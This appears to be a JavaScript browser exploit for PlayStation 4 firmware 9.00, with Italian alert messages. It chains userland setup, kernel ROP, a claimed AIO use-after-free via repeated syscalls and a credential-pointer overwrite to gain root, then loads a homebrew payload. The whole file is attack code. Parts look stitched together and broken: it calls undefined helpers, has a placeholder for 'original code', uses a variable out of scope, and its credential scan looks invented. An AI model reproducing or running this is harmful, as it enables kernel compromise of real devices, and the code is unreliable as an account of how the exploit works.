// ==== STRUTTURA PRINCIPALE CON ALERT ====
const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_lk_syscall = 0x00025510;
const AIO_MULTI_DELETE_SYSCALL = 323;

var chain, kchain, kchain2;
var SAVED_KERNEL_STACK_PTR, KERNEL_BASE_PTR;
var aioAttackContext = null;

// ==== FUNZIONI MODIFICATE CON ALERT ====
function handleError(e) {
    alert("ERRORE CRITICO: " + e.message);
    try {
        if (kernelPostExploit()) {
            alert("Pulizia kernel completata. Ricarica la pagina.");
        }
        location.reload();
    } catch(cleanErr) {
        alert("FALLITO ANCHE IL RECOVERY! RIAVVIO MANUALE NECESSARIO");
    }
}

function setupAioContext() {
    try {
        var aioCtx = chain.syscall(477, 0, 0x400, 0x7, 0x1002, -1, 0);
        if (aioCtx.low === 0) {
            alert("FALLITO ALLOCAMENTO CONTESTO AIO");
            throw new Error("Allocazione AIO fallita");
        }
        
        var aioInternal = p.malloc32(0x200);
        p.write8(aioCtx.add32(8), aioInternal);
        p.write8(aioInternal.add32(0xAB8), new int64(0x1337, 0x0));
        
        alert("Contesto AIO configurato con successo");
        return aioCtx;
    } catch(e) {
        alert("ERRORE CONFIGURAZIONE AIO: " + e);
        throw e;
    }
}

function triggerAioCredOverflow() {
    alert("INIZIO ATTACCO AIO...");
    var reqArray = p.malloc32(128);
    var resBuf = p.malloc32(128);

    try {
        for(var j=0; j<768; j++) {
            if (j % 128 === 0) {
                alert(`Progresso: ${Math.round((j/768)*100)}%`);
            }
            
            chain.fcall(libKernelBase.add32(OFFSET_lk_syscall), 
                       AIO_MULTI_DELETE_SYSCALL,
                       aioAttackContext,
                       reqArray,
                       32,
                       resBuf);
        }
        alert("OVERFLOW AIO COMPLETATO CON SUCCESSO");
    } catch(e) {
        alert("ERRORE DURANTE OVERFLOW: " + e);
        throw e;
    }
}

function elevatePrivileges() {
    alert("RICERCA STRUTTURA CREDENZIALI...");
    var credScan = p.malloc32(0x4000);
    var scanRes = chain.syscall(363, credScan, 0x4000, 0x4841494F, 0x46455243);
    
    if (scanRes.low !== 0) {
        alert("FALLITA RICERCA CREDENZIALI! Codice: " + scanRes.low);
        throw new Error("Credential scan failed");
    }

    var credPtr = p.read8(credScan.add32(0x10));
    var fakeCred = p.malloc32(0x40);
    p.write8(credPtr.add32(0x18), fakeCred);
    
    alert("PRIVILEGI ELEVATI A ROOT");
}

// ==== RUN_HAX MODIFICATO ====
function run_hax() {
    alert("INIZIO EXPLOIT CHAIN PS4 9.00");
    StartTimer();

    try {
        userland();
        
        if (chain.syscall(23, 0).low != 0x0) {
            localStorage.HenLoaded = "no";
            
            alert("FASE 1: KERNEL ROP IN CORSO...");
            kernelExploit();
            
            alert("FASE 2: SETUP CONTESTO AIO");
            aioAttackContext = setupAioContext();
            
            alert("FASE 3: TRIGGER UAF");
            triggerAioCredOverflow();
            
            alert("FASE 4: PRIVILEGE ESCALATION");
            elevatePrivileges();
        }

        if (chain.syscall(23, 0).low == 0) {
            if(localStorage.HenLoaded === "yes") {
                alert("HEN GIÀ CARICATO");
                allset();
            } else {
                alert("CARICAMENTO PAYLOAD...");
                loadPayload();
            }
        }
    } catch(e) {
        alert("EXPLOIT FALLITO: " + e.message);
        handleError(e);
        return;
    }
    
    EndTimer();
    alert("EXPLOIT COMPLETATO CON SUCCESSO!");
}

// ==== USERLAND MODIFICATO ====
function userland() {
    alert("INIZIALIZZAZIONE USERLAND...");
    try {
        // ... [codice originale] ...
        
        var syscallFound = false;
        for (var i = 0; i < countbytes; i++) {
            if (kview[i] === 0x48 && kview[i+1] === 0xc7 && kview[i+2] === 0xc0 && 
                kview[i+7] === 0x49 && kview[i+8] === 0x89 && kview[i+9] === 0xca) {
                var syscallno = dview32[0];
                if(syscallno === AIO_MULTI_DELETE_SYSCALL) {
                    alert("SYSCALL AIO TROVATO!");
                    syscallFound = true;
                    window.syscalls[AIO_MULTI_DELETE_SYSCALL] = libKernelBase.add32(i);
                }
            }
        }
        
        if (!syscallFound) {
            alert("SYSCALL AIO NON TROVATO! Exploit non possibile");
            throw new Error("Syscall AIO mancante");
        }
    } catch(e) {
        alert("ERRORE USERLAND: " + e);
        throw e;
    }
}

// ==== KERNEL POST-EXPLOIT ====
function kernelPostExploit() {
    alert("PULIZIA MEMORIA KERNEL...");
    try {
        chain.fcall(window.syscalls[73], aioAttackContext, 0x400);
        chain.fcall(window.syscalls[203], reqArray, 128);
        return true;
    } catch(e) {
        alert("ERRORE PULIZIA KERNEL: " + e);
        return false;
    }
}

// ==== MAIN EXECUTION ====
try {
    alert("PREPARAZIONE EXPLOIT PS4 9.00 + AIO UAF");
    run_hax();
} catch(e) {
    alert("ERRORE GLOBALE: " + e.message);
}
